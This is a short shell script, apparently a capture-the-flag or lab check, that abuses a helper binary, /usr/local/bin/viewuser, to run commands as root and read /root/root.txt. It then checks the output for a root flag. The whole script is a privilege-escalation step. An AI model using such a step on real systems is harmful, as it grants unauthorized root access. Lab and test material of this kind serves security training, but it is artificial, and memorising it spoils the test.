set -eu
out=$(/usr/local/bin/viewuser -p -c 'id -u; cat /root/root.txt' 2>&1)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "viewuser helper did not give root" >&2; exit 1; }
